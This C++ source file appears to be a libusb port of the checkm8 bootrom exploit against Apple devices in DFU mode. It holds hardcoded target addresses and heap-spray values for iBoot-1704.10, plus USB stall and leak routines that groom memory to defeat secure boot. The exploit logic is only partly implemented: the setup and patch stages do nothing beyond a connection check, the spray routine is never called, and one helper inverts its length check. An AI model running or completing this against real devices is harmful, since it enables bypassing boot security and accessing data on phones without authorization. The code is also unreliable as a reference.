#include "checkm8.h"

#include <stdio.h>
#include <stdint.h>

#define USB_TIMEOUT 5
#define APPLE_VID 0x05AC
#define DFU_PID 0x1227

#define USB_MAX_STRING_DESCRIPTOR_IDX 10
#define EP0_MAX_PACKET_SZ 0x40

enum class Stage : int32_t
{
	kReset,
	kSpray,
	kSetup,
	kPatch,
	kPwned
};

static const char *pwnd_str = " PWND:[";

namespace LibUsb
{
	struct UsbDesc
	{
		uint16_t m_vendorId;
		uint16_t m_productId;
		int m_usbInterface;
		struct libusb_context* m_usbCtxt;
		struct libusb_device_handle* m_deviceHandle;

		UsbDesc();
	};

	UsbDesc::UsbDesc()
	{
		m_vendorId = APPLE_VID;
		m_productId = DFU_PID;
		m_usbInterface = 0;
		m_usbCtxt = NULL;
		m_deviceHandle = NULL;
	};

	struct TransferDesc
	{
		int32_t  m_result;
		uint32_t m_sz;

		TransferDesc();
	};

	TransferDesc::TransferDesc()
	{
		m_result = 0;
		m_sz = 0;
	}

	struct UsbDeviceDescriptor
	{
		uint8_t m_bLen; //length in bytes of this descriptor
		uint8_t m_bDescriptorType; //Specifies the descriptor type. Must be set to USB_DEVICE_DESCRIPTOR_TYPE.
		uint16_t m_bcdUSB; //Identifies the version of the USB specification that this descriptor structure complies with. This value is a binary-coded decimal number.
		uint8_t m_bDeviceClass; //Specifies the class code of the device as assigned by the USB specification group.
		uint8_t m_bDeviceSubClass; //Specifies the subclass code of the device as assigned by the USB specification group.
		uint8_t m_bDeviceProtocol; //Specifies the protocol code of the device as assigned by the USB specification group.
		uint8_t m_bMaxPacketSize0; //Specifies the maximum packet size, in bytes, for endpoint zero of the device. The value must be set to 8, 16, 32, or 64.
		uint16_t m_idVendor; //Specifies the vendor identifier for the device as assigned by the USB specification committee.
		uint16_t m_idProduct; //Specifies the product identifier. This value is assigned by the manufacturer and is device-specific.
		uint16_t m_bcdDevice; //Identifies the version of the device. This value is a binary-coded decimal number
		uint8_t m_iManufacturer; //Specifies a device-defined index of the string descriptor that provides a string containing the name of the manufacturer of this device.
		uint8_t m_iProduct; //Specifies a device-defined index of the string descriptor that provides a string that contains a description of the device.
		uint8_t m_iSerialNumber; //Specifies a device-defined index of the string descriptor that provides a string that contains a manufacturer-determined serial number for the device.
		uint8_t m_bNumConfigurations; //Specifies the total number of possible configurations for the device.
	};

	UsbDeviceDescriptor g_usbDeviceDescriptor;

	struct HackConfig 
	{
		uint16_t	m_cpid;	
		uint8_t		m_pad[6];
		size_t		m_cfgHole;
		size_t		m_cfgLargeLeak;							
		size_t		m_cfgOverwritePad;						
		uint64_t	m_patchAddr;								
		uint64_t	m_memcpyAddr;								
		uint64_t	m_aesCryptoCmd;							
		uint64_t	m_bootTrampEnd;							
		uint64_t	m_usbSerialNumber;							
		uint64_t	m_dfuHandleRequest;						
		uint64_t	m_usbCoreDoTransfer;						
		uint64_t	m_insecureMemoryBase;						
		uint64_t	m_handleInterfaceRequest;					
		uint64_t	m_usbCreateStringDescriptor;				
		uint64_t	m_usbSerialNumberStringDescriptor;		
	};

	HackConfig g_hackConfig;

	int Init(UsbDesc* pDesc)
	{
		int ret = libusb_init(&pDesc->m_usbCtxt);
		if (ret == LIBUSB_SUCCESS)
		{
			return 0;
		}
		return -1;
	}

	void Shutdown(UsbDesc* pDesc)
	{
		libusb_release_interface(pDesc->m_deviceHandle, pDesc->m_usbInterface);
		libusb_close(pDesc->m_deviceHandle);
		libusb_exit(pDesc->m_usbCtxt);
	}

	int WaitForUsb(UsbDesc* pDesc, int usbInterface0, int usbInterface1, bool& hasAlreadyBeenPwn3d, bool& bAlreadyBeenFound)
	{
		//if the library has been inited
		if (pDesc && pDesc->m_usbCtxt != NULL)
		{
			if (bAlreadyBeenFound)
			{
				return true;
			}
			printf("[*] Waiting for usb with vid 0x%04X and pid 0x%04X\n", pDesc->m_vendorId, pDesc->m_productId);
			for (;;)
			{
				// find the device with a particular idVendor/idProduct combination.
				libusb_device_handle* handle = libusb_open_device_with_vid_pid(pDesc->m_usbCtxt, pDesc->m_vendorId, pDesc->m_productId);
				if(handle != NULL)
				{
					pDesc->m_deviceHandle = handle;
					int config;
					//1)Determine the bConfigurationValue of the currently active configuration.
					//2)Set the active configuration for a device.
					//3)Claim an interface on a given device handle.
					if (libusb_get_configuration(handle, &config) == LIBUSB_SUCCESS
						&& libusb_set_configuration(handle, config) == LIBUSB_SUCCESS
						&& libusb_claim_interface(handle, usbInterface0) == LIBUSB_SUCCESS)
					{
						//Activate an alternate setting for an interface.
						if (libusb_set_interface_alt_setting(handle, usbInterface0, usbInterface1) == LIBUSB_SUCCESS
							&& CheckUsbDevice(pDesc, &hasAlreadyBeenPwn3d))
						{
							pDesc->m_usbInterface = usbInterface0;
							puts("[+] Found the USB handle...");
							return true;
						}
						libusb_release_interface(handle, usbInterface0);
					}
					libusb_close(handle);
				}
				Sleep(USB_TIMEOUT);
			}
		}
	}

	int CheckUsbDevice(UsbDesc* pDesc, bool* res)
	{
		char* serialNumString = GetUsbSerialNumber(pDesc);
		int ret = 0;
		if (serialNumString != NULL)
		{
			puts(serialNumString);
			if (strstr(serialNumString, " SRTG:[iBoot-1704.10]") != NULL)
			{
				g_hackConfig.m_cpid = 0x8960;
				g_hackConfig.m_cfgHole = 0;	//unused for this version
				g_hackConfig.m_cfgLargeLeak = 7936;
				g_hackConfig.m_cfgOverwritePad = 0x5C0;
				g_hackConfig.m_patchAddr = 0x100005CE0;
				g_hackConfig.m_memcpyAddr = 0x10000ED50;
				g_hackConfig.m_aesCryptoCmd = 0x10000B9A8;
				g_hackConfig.m_bootTrampEnd = 0x1800E1000;
				g_hackConfig.m_usbSerialNumber = 0x180086CDC;
				g_hackConfig.m_dfuHandleRequest = 0x180086C70;
				g_hackConfig.m_usbCoreDoTransfer = 0x10000CC78;
				g_hackConfig.m_insecureMemoryBase = 0x180380000;
				g_hackConfig.m_handleInterfaceRequest = 0x10000CFB4;
				g_hackConfig.m_usbCreateStringDescriptor = 0x10000BFEC;
				g_hackConfig.m_usbSerialNumberStringDescriptor = 0x180080562;
			}
			*res = strstr(serialNumString, pwnd_str) != NULL;
			ret = 1;
			free(serialNumString);
		}
		return ret;
	}

	char* GetUsbSerialNumber(UsbDesc* pDesc)
	{
		TransferDesc tDesc;
		uint8_t buf[UINT8_MAX];
		char* str = NULL;
		size_t i, sz;
		/*
		bmRequestType = 0x80 - direction of Data Stage
								-standard request type
								-device is the recipient of the request
		bRequest = 6 — request to get a descriptor (GET_DESCRIPTOR)

		*/
		if( PerformUsbControlTransfer(pDesc, 0x80, 0x6, 1U << 8U, 0, reinterpret_cast<uint8_t*>(&g_usbDeviceDescriptor), sizeof(UsbDeviceDescriptor), &tDesc) 
			&& tDesc.m_result == 0
			&& tDesc.m_sz == sizeof(UsbDeviceDescriptor)
			&& PerformUsbControlTransfer(pDesc, 0x80, 0x6, (3U << 8U) | g_usbDeviceDescriptor.m_iSerialNumber, 0x409, buf, sizeof(buf), &tDesc)
			&& tDesc.m_sz == buf[0]
			&& (sz = buf[0] / 2) != 0
			&& ( (str = reinterpret_cast<char*>(malloc(sz))) != NULL)
			)
		{
			for (i = 0; i < sz; ++i) {
				str[i] = (char)buf[2 * (i + 1)];
			}
			str[sz - 1] = '\0';
		}
		return str;
	}

	bool PerformUsbControlTransfer(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, unsigned char* data, uint16_t wLength, TransferDesc* pTd)
	{
		/*Perform a USB control transfer.*/
		/*returns on success, the number of bytes actually transferred*/
		int ret = libusb_control_transfer(pDesc->m_deviceHandle, reqType, bRequest, wValue, wIndex, data, wLength, USB_TIMEOUT);
		if (pTd)
		{
			if (ret >= 0)
			{
				pTd->m_sz = ret;
				pTd->m_result = 0;

			}
			else if (ret == LIBUSB_ERROR_PIPE)
			{
				pTd->m_result = LIBUSB_ERROR_PIPE;
			}
			else
			{
				pTd->m_result = ret;
			}
		}
		return true;
	}

	void RunTest()
	{
		UsbDesc desc;
		int ret = Init(&desc);
		//libusb_set_debug(desc.m_usbCtxt, 3);
		if (ret == 0)
		{
			bool hasAlreadyBeenPwn3d = false;
			bool bAlreadyBeenFound = false;
			Stage stage = Stage::kReset;
		//	while (stage != Stage::kPwned && WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound) )
			WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound);
			while (stage != Stage::kPwned )
			{
				if (hasAlreadyBeenPwn3d == false)
				{
					switch (stage)
					{
						case(Stage::kReset):
						{
							bAlreadyBeenFound = true;
							puts("[+] Stage Reset");
							if (g_hackConfig.m_cpid == 0x7000 || g_hackConfig.m_cpid == 0x7001 || g_hackConfig.m_cpid == 0x8000 || g_hackConfig.m_cpid == 0x8003)
							{
								stage = Stage::kSetup;
							}
							else
							{
								stage = Stage::kSpray;
							}
							break;
						}
						case(Stage::kSpray):
						{
							if (IsDeviceStillConnected(&desc))
							{
								puts("[+] Stage Spray");
								stage = Stage::kSetup;
							}
							else
							{
								puts("[-] Device Disconnected");
								puts("[!] Quitting...");
							}
							break;
						}
						case(Stage::kSetup):
						{
							puts("[+] Stage Setup");
							if (IsDeviceStillConnected(&desc))
							{
								stage = Stage::kPatch;
							}
							else
							{
								puts("[-] Device Disconnected");
								puts("[!] Quitting...");
							}
							break;
						}
						case(Stage::kPatch):
						{
							puts("[+] Stage Patch");
							if (IsDeviceStillConnected(&desc))
							{
								stage = Stage::kPwned;
							}
							else
							{
								puts("[-] Device Disconnected");
								puts("[!] Quitting...");
							}
							break;
						}
						default:
						{
							IsDeviceStillConnected(&desc);
							puts("[+] Stage Unknown");
							puts("[!] Quitting...");
							stage = Stage::kPwned;
							break;
						}
					}
				}
				else
				{
					puts("[!] Now you can boot untrusted images.");
					stage = Stage::kPwned;
				}
			}
			Shutdown(&desc);
		}
	}
	/*TODO: use the other way this seems to crash a lot*/
	bool IsDeviceStillConnected(UsbDesc* pDesc)
	{
		return libusb_open_device_with_vid_pid(pDesc->m_usbCtxt, pDesc->m_vendorId, pDesc->m_productId) != NULL;
	}

	int SprayStage(UsbDesc* pDesc)
	{
		if (g_hackConfig.m_cfgLargeLeak == 0)
		{
			if (!Checkm8::Stall(pDesc))
			{
				return 0;
			}
			for (int i = 0; i < g_hackConfig.m_cfgHole; i++)
			{
				if (!Checkm8::NoLeak(pDesc))
				{
					return 0;
				}
			}
			if (!Checkm8::UsbRequestLeak(pDesc) || !Checkm8::NoLeak(pDesc))
			{
				return 0;
			}
		}
		else
		{
			if (!Checkm8::UsbRequestStall(pDesc))
			{
				return 0;
			}
			for (int i = 0; i < g_hackConfig.m_cfgLargeLeak; i++)
			{
				if (!Checkm8::UsbRequestLeak(pDesc))
				{
					return 0;
				}
			}
			if (!Checkm8::UsbRequestNoLeak(pDesc))
			{
				return 0;
			}
		}
		return 1;
	}

	//see https://www.cs.unm.edu/~hjelmn/libusb_hotplug_api/group__asyncio.html#ga5447311149ec2bd954b5f1a640a8e231
	int SendControlRequestAsync(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, unsigned char* pData, uint16_t wLength, uint32_t abortTimeout, TransferDesc* pTd)
	{
		// Allocate a transfer with the number of isochronous packet descriptors specified by iso_packets
		struct libusb_transfer* pTransfer = libusb_alloc_transfer(0);
		int done = 0;
		if (pTransfer != NULL) 
		{
			//Allocate a buffer of size LIBUSB_CONTROL_SETUP_SIZE plus the size of the data you are sending/requesting.
			uint8_t* pBuf = reinterpret_cast<uint8_t*>(malloc(LIBUSB_CONTROL_SETUP_SIZE + wLength));
			if (pBuf)
			{
				//If this is a host-to-device transfer with a data stage, put the data in place after the setup packet
				if ((reqType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT)
				{
					memcpy(pBuf + LIBUSB_CONTROL_SETUP_SIZE, pData, wLength);
				}
				//Helper function to populate the setup packet (first 8 bytes of the data buffer) for a control transfer.
				libusb_fill_control_setup(pBuf, reqType, bRequest, wValue, wIndex, wLength);
				//If you pass a transfer buffer to this function, the first 8 bytes will be interpreted as a control setup packet, 
				//and the wLength field will be used to automatically populate the length field of the transfer.
				libusb_fill_control_transfer(pTransfer, pDesc->m_deviceHandle, pBuf, UsbAsyncCallback, &done, USB_TIMEOUT);
				//Submit a transfer.
				int ret = libusb_submit_transfer(pTransfer);
				if (ret == LIBUSB_SUCCESS)
				{
					struct timeval tv;
					tv.tv_sec = abortTimeout / 1000;
					tv.tv_usec = (abortTimeout % 1000) * 1000;
					//Handle any pending events by checking if timeouts have expired and by checking 
					//the set of file descriptors for activity. 
					//If the completed argument is not equal to NULL, this function will loop until a transfer completion 
					//callback sets the variable pointed to by the completed argument to non-zero.
					while (done == 0 && libusb_handle_events_timeout_completed(pDesc->m_usbCtxt, &tv, &done) == LIBUSB_SUCCESS)
					{
						libusb_cancel_transfer(pTransfer);
					}
					if (done != 0)
					{
						//get eventual in data ???
						if ((reqType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_IN)
						{
							memcpy(pData, libusb_control_transfer_get_data(pTransfer), pTransfer->actual_length);
						}
						if (pTd != NULL)
						{
							pTd->m_sz = (uint32_t)pTransfer->actual_length;
							if (pTransfer->status == LIBUSB_TRANSFER_COMPLETED)
							{
								pTd->m_result = LIBUSB_TRANSFER_COMPLETED;
							}
							else if (pTransfer->status == LIBUSB_TRANSFER_STALL)
							{
								pTd->m_result = LIBUSB_TRANSFER_STALL;
							}
							else
							{
								pTd->m_result = LIBUSB_TRANSFER_ERROR;
							}
						}
					}
				}
				else
				{
					printf("[-] libusb_submit_transfer Failed. ret: 0x%08X\n", ret);
				}
				free(pBuf);
			}
			else
			{
				puts("[!] Failed to allocate data for aync transfer");
			}
			libusb_free_transfer(pTransfer);
		}
		return done;
	}

	void UsbAsyncCallback(struct libusb_transfer* pTransfer)
	{
		*reinterpret_cast<int*>(pTransfer->user_data) = 1;
	}

	int SendControlRequestAsyncWnoData(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, uint16_t wLength, uint32_t abortTimeout, TransferDesc* pTd)
	{
		int ret = 0;
		if (wLength != 0)
		{
			//make sure we send no data
			ret = SendControlRequestAsync(pDesc, reqType, bRequest, wValue, wIndex, NULL, 0, abortTimeout, pTd);
		}
		else
		{
			uint8_t* pData = reinterpret_cast<uint8_t*>(malloc(wLength));
			if (pData != NULL)
			{
				memset(pData, '\0', wLength);
				ret = SendControlRequestAsync(pDesc, reqType, bRequest, wValue, wIndex, pData, wLength, abortTimeout, pTd);
				free(pData);
			}
		}
		return ret;
	}
	//sync request
	int SendControlRequest(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, void* pData, uint16_t wLength, TransferDesc* pTd)
	{
		//Perform a USB control transfer.
		int ret = libusb_control_transfer(pDesc->m_deviceHandle, reqType, bRequest, wValue, wIndex, reinterpret_cast<uint8_t*>(pData), wLength, USB_TIMEOUT);
		if (pTd != NULL)
		{
			if (ret >= 0)
			{
				pTd->m_sz = (uint32_t)ret;
				pTd->m_result = LIBUSB_TRANSFER_COMPLETED;
			}
			else if (ret == LIBUSB_ERROR_PIPE)
			{
				pTd->m_result = LIBUSB_ERROR_PIPE;
			}
			else
			{
				pTd->m_result = LIBUSB_TRANSFER_ERROR;
			}
		}
		return 1;
	}
	//sync request with empty data
	int SendControlRequestWnoData(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, uint16_t wLength, TransferDesc* pTd)
	{
		int ret = 0;
		if (wLength == 0)
		{
			ret = SendControlRequest(pDesc, reqType, bRequest, wValue, wIndex, NULL, 0, pTd);
		}
		else
		{
			void* pData = malloc(wLength);
			if (pData != NULL)
			{
				memset(pData, '\0', wLength);
				ret = SendControlRequest(pDesc, reqType, bRequest, wValue, wIndex, pData, wLength, pTd);
				free(pData);
			}
		}
		return ret;
	}

} /*end LibUsb*/

namespace Checkm8
{
	int Stall(LibUsb::UsbDesc* pDesc)
	{
		unsigned usb_abort_timeout = 0;
		LibUsb::TransferDesc transferDesc;
		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ;
		while (SendControlRequestAsyncWnoData(pDesc, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, LIBUSB_REQUEST_GET_DESCRIPTOR, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, wLength, usb_abort_timeout, &transferDesc))
		{
			if (transferDesc.m_sz < wLength 
				&& SendControlRequestAsyncWnoData(pDesc, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, LIBUSB_REQUEST_GET_DESCRIPTOR, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transferDesc)
				&& transferDesc.m_sz == 0)
			{
				return true;
			}
			usb_abort_timeout = (usb_abort_timeout + 1) % USB_TIMEOUT;
		}
		return false;
	}

	int NoLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc transferDesc;
		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ + 1;
		return LibUsb::SendControlRequestAsyncWnoData(
			pDesc, 
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,
			LIBUSB_REQUEST_GET_DESCRIPTOR,
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
			USB_MAX_STRING_DESCRIPTOR_IDX, 
			wLength, 
			1, 
			&transferDesc) && transferDesc.m_sz == 0;
	}

	int UsbRequestLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;

		return LibUsb::SendControlRequestAsyncWnoData(
			pDesc, 
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
			EP0_MAX_PACKET_SZ,																//wLength
			1,																				//abortTimeout
			&tDesc) && tDesc.m_sz == 0;

	}

	int UsbRequestNoLeak(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;

		return SendControlRequestAsyncWnoData(
			pDesc,
			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber,
			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
			EP0_MAX_PACKET_SZ + 1,															//wLength
			1,																				//abortTimeout
			&tDesc) && tDesc.m_sz == 0;
	}

	int UsbRequestStall(LibUsb::UsbDesc* pDesc)
	{
		LibUsb::TransferDesc tDesc;
		//Synchronous request	
		return SendControlRequestWnoData(
			pDesc,  
			LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_ENDPOINT,	//requestType
			LIBUSB_REQUEST_SET_FEATURE,														//bRequest
			0,																				//wValue
			0x80,																			//wIndex
			0,																				//wLength
			&tDesc) 
			&& tDesc.m_result == LIBUSB_TRANSFER_STALL;
	}
}